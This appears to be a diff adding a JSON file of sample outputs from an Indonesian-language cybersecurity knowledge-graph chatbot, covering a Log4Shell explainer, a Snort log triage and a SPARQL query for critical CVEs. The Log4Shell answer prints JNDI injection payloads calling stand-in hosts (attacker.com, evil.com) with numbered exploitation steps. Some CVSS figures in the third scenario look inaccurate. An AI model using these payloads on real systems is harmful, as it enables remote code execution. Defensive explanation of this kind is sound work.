@@ -1,0 +1,43 @@
+{
+  "_description": "Contoh output dari SEPSES CSKG LLM Chatbot — respons sistem untuk setiap skenario input",
+  "_note": "Setiap output menunjukkan: jawaban LLM, konteks KG yang digunakan, SPARQL yang dieksekusi, dan metadata performa",
+
+  "output_scenario_1_security_analysis": {
+    "_input": "Jelaskan kerentanan CVE-2021-44228 dan bagaimana attacker bisa mengeksploitasinya?",
+    "mode": "Security Analysis",
+    "llm": "openai/gpt-4o-mini",
+    "latency_ms": 3842.5,
+
+    "answer": "## CVE-2021-44228 — Log4Shell\n\n**Ringkasan**: CVE-2021-44228 adalah kerentanan Remote Code Execution (RCE) kritis pada Apache Log4j2 versi 2.0-beta9 hingga 2.15.0. Kerentanan ini memungkinkan penyerang mengeksekusi kode arbitrer melalui JNDI lookup yang tidak tervalidasi.\n\n### Skor CVSS\n- **Base Score**: 10.0 (CRITICAL)\n- **Attack Vector**: NETWORK\n- **Attack Complexity**: LOW\n- **Privileges Required**: NONE\n\n### Kelemahan Terkait (CWE)\n| CWE ID | Nama | Deskripsi |\n|--------|------|-----------|\n| CWE-917 | Expression Language Injection | Input tidak disanitasi pada expression language |\n| CWE-20 | Improper Input Validation | Validasi input tidak memadai |\n| CWE-502 | Deserialization of Untrusted Data | Deserialisasi data dari sumber tidak terpercaya |\n\n### Pola Serangan (CAPEC)\n- **CAPEC-586**: Object Injection — Penyerang mengirim payload `${jndi:ldap://attacker.com/exploit}` dalam field yang di-log\n\n### Langkah Eksploitasi\n1. Penyerang mengirim HTTP request dengan header jahat: `X-Api-Version: ${jndi:ldap://evil.com/a}`\n2. Aplikasi yang menggunakan Log4j2 mencatat header tersebut ke log\n3. Log4j2 memproses JNDI lookup dan terhubung ke server LDAP penyerang\n4. Server penyerang mengembalikan class Java berbahaya\n5. Kode dieksekusi di server korban → **Full Remote Code Execution**\n\n### Rekomendasi Mitigasi\n1. **Upgrade Log4j** ke versi 2.17.1 atau lebih baru\n2. Set `-Dlog4j2.formatMsgNoLookups=true`\n3. Hapus class `JndiLookup` dari classpath\n4. Monitor traffic outbound ke port LDAP/RMI (389, 1099)\n\n### Produk Terdampak\n- `apache:log4j:2.0-beta9` hingga `apache:log4j:2.15.0`",
+
+    "context": "=== CVE-2021-44228 ===\nDescription: Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.\nCVSS: 10.0 | Attack Vector: NETWORK\nCWEs: CWE-917 (Expression Language Injection), CWE-20 (Improper Input Validation), CWE-400 (Uncontrolled Resource Consumption), CWE-502 (Deserialization of Untrusted Data)\nCAPECs: CAPEC-586 (Object Injection)\nCPE Products: cpe:2.3:a:apache:log4j:2.0:beta9, cpe:2.3:a:apache:log4j:2.14.1, cpe:2.3:a:apache:log4j:2.15.0",
+
+    "sparql_used": "Multi-hop traversal: CVE-2021-44228 → CWE → CAPEC → ATT&CK"
+  },
+
+  "output_scenario_2_log_analysis": {
+    "_input": "Analisis log ini, temukan ancaman kritis dan rekomendasikan mitigasi",
+    "mode": "Log Analysis",
+    "llm": "openai/gpt-4o-mini",
+    "latency_ms": 5120.8,
+
+    "answer": "## Analisis Log Keamanan\n\nDari log Snort yang diunggah, terdeteksi **13 alert** dengan distribusi berikut:\n\n### Ringkasan Ancaman\n| # | Severity | Alert | Source IP | Target |\n|---|----------|-------|-----------|--------|\n| 1 | 🔴 CRITICAL | CVE-2021-44228 Log4Shell Exploit | 203.0.113.42 | 10.0.0.15:8080 |\n| 2 | 🔴 CRITICAL | CVE-2017-0144 EternalBlue SMB | 203.0.113.55 | 10.0.0.5:445 |\n| 3 | 🔴 CRITICAL | CVE-2014-0160 Heartbleed SSL | 203.0.113.77 | 10.0.0.8:443 |\n| 4 | 🔴 CRITICAL | Reverse Shell Outbound | 10.0.0.25 | 203.0.113.200:4444 |\n| 5 | 🟠 HIGH | SQL Injection Attempt | 192.168.100.50 | 10.0.0.10:3306 |\n| 6 | 🟠 HIGH | Brute Force SSH (3x) | 198.51.100.22 | 10.0.0.1:22 |\n\n### Korelasi Knowledge Graph\n- **CVE-2021-44228** → CWE-917 → CAPEC-586: Remote Code Execution via JNDI\n- **CVE-2017-0144** → CWE-20 → CAPEC-66: SMB buffer overflow\n- **CVE-2014-0160** → CWE-119 → CAPEC-100: Buffer over-read\n\n### Rekomendasi Prioritas\n1. **SEGERA**: Isolasi host 10.0.0.25 — terdeteksi reverse shell aktif ke 203.0.113.200:4444\n2. **KRITIS**: Patch Log4j di 10.0.0.15 dan blokir IP 203.0.113.42\n3. **KRITIS**: Patch SMB (MS17-010) di 10.0.0.5, tutup port 445\n4. **TINGGI**: Implementasi rate-limiting SSH di 10.0.0.1",
+
+    "context": "[HIGH] Src: 203.0.113.42 → Dst: 10.0.0.15 | [SNORT_ALERT] Timestamp: 2024-06/24-09:13:01.789012 | CVE References: CVE-2021-44228 | Message: CVE-2021-44228 Log4Shell Exploit Attempt\n[HIGH] Src: 203.0.113.55 → Dst: 10.0.0.5 | [SNORT_ALERT] Timestamp: 2024-06/24-09:16:45.345678 | CVE References: CVE-2017-0144 | Message: CVE-2017-0144 EternalBlue SMB Exploit\n[HIGH] Src: 203.0.113.77 → Dst: 10.0.0.8 | [SNORT_ALERT] Timestamp: 2024-06/24-09:20:15.456789 | CVE References: CVE-2014-0160 | Message: CVE-2014-0160 Heartbleed SSL Attack\n[HIGH] Src: 10.0.0.25 → Dst: 203.0.113.200 | [SNORT_ALERT] Message: Reverse Shell Activity Detected\n[HIGH] Src: 192.168.100.50 → Dst: 10.0.0.10 | [SNORT_ALERT] Message: SQL Injection Attempt",
+
+    "sparql_used": "N/A — ChromaDB hybrid search"
+  },
+
+  "output_scenario_3_kg_question_answering": {
+    "_input": "Produk apa saja yang terdampak kerentanan dengan skor CVSS di atas 9?",
+    "mode": "KG Question Answering",
+    "llm": "openai/gpt-4o-mini",
+    "latency_ms": 4250.3,
+
+    "answer": "## Produk dengan Kerentanan CVSS > 9.0\n\nBerdasarkan data SEPSES Knowledge Graph, berikut produk-produk yang memiliki kerentanan dengan skor CVSS di atas 9.0 (CRITICAL):\n\n| CVE ID | CVSS Score | Produk Terdampak |\n|--------|-----------|------------------|\n| CVE-2021-44228 | 10.0 | Apache Log4j 2.x |\n| CVE-2017-0144 | 9.3 | Microsoft Windows SMB |\n| CVE-2014-0160 | 9.4 | OpenSSL 1.0.1 |\n| CVE-2019-19781 | 9.8 | Citrix ADC / Gateway |\n| CVE-2021-34527 | 9.0 | Windows Print Spooler |\n\n**Catatan**: Data ini berasal dari SEPSES CSKG yang berisi snapshot NVD. Untuk data terkini, cek langsung di https://nvd.nist.gov",
+
+    "context": "cveId: CVE-2021-44228 | score: 10.0 | cpeProduct: cpe:2.3:a:apache:log4j\ncveId: CVE-2017-0144 | score: 9.3 | cpeProduct: cpe:2.3:o:microsoft:windows\ncveId: CVE-2014-0160 | score: 9.4 | cpeProduct: cpe:2.3:a:openssl:openssl\ncveId: CVE-2019-19781 | score: 9.8 | cpeProduct: cpe:2.3:a:citrix:adc\ncveId: CVE-2021-34527 | score: 9.0 | cpeProduct: cpe:2.3:o:microsoft:windows",
+
+    "sparql_used": "PREFIX cve: <http://w3id.org/sepses/vocab/ref/cve#>\nPREFIX cvss: <http://w3id.org/sepses/vocab/ref/cvss#>\nPREFIX cpe: <http://w3id.org/sepses/vocab/ref/cpe#>\n\nSELECT DISTINCT ?cveId ?score ?cpeProduct\nWHERE {\n    ?cve cve:cveId ?cveId ;\n         cve:hasCPE ?cpe ;\n         cve:hasCVSS ?cvssNode .\n    ?cvssNode cvss:baseScore ?score .\n    ?cpe cpe:productId ?cpeProduct .\n    FILTER(?score >= 9.0)\n}\nORDER BY DESC(?score)\nLIMIT 20"
+  }
+}
